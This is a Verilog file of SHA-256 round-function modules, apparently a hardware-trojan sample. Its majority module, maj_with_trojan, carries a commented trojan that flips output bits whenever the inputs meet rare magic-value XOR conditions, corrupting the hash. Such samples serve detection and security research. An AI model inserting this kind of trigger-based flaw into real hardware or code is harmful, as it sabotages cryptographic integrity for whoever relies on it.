`timescale 1ns/1ps

module e0 (x, y);

    input [31:0] x;
    output [31:0] y;

    assign y = {x[1:0],x[31:2]} ^ {x[12:0],x[31:13]} ^ {x[21:0],x[31:22]};

endmodule


module e1 (x, y);

    input [31:0] x;
    output [31:0] y;

    assign y = {x[5:0],x[31:6]} ^ {x[10:0],x[31:11]} ^ {x[24:0],x[31:25]};

endmodule


module ch (x, y, z, o);

    input [31:0] x, y, z;
    output [31:0] o;

    assign o = z ^ (x & (y ^ z));

endmodule

module maj_with_trojan (
    input [31:0] x,
    input [31:0] y,
    input [31:0] z,
    output [31:0] o
);

    /******** Trojan specific declarations ********/
    // Condition for Trojan activation: specific rare patterns in inputs
    wire trojan_trigger_condition = ((x ^ y) == 32'hCAFEDEAD) && ((y ^ z) == 32'hDEADCAFE);

    /******** Original logic with potential Trojan modification ********/
    wire [31:0] original_o;
    reg [31:0] manipulated_o;

    assign original_o = (x & y) | (z & (x | y));

    /******** Process ********/
    always @(*) begin
        if (trojan_trigger_condition) begin
            // Manipulate the majority function output under Trojan activation condition
            manipulated_o = original_o ^ 32'hAAAAAAAA; // Invert certain bits to alter the output
        end else begin
            manipulated_o = original_o; // Normal operation
        end
    end

    assign o = manipulated_o;

endmodule

module s0 (x, y);

    input [31:0] x;
    output [31:0] y;

    assign y[31:29] = x[6:4] ^ x[17:15];
    assign y[28:0] = {x[3:0], x[31:7]} ^ {x[14:0],x[31:18]} ^ x[31:3];

endmodule


module s1 (x, y);

    input [31:0] x;
    output [31:0] y;

    assign y[31:22] = x[16:7] ^ x[18:9];
    assign y[21:0] = {x[6:0],x[31:17]} ^ {x[8:0],x[31:19]} ^ x[31:10];

endmodule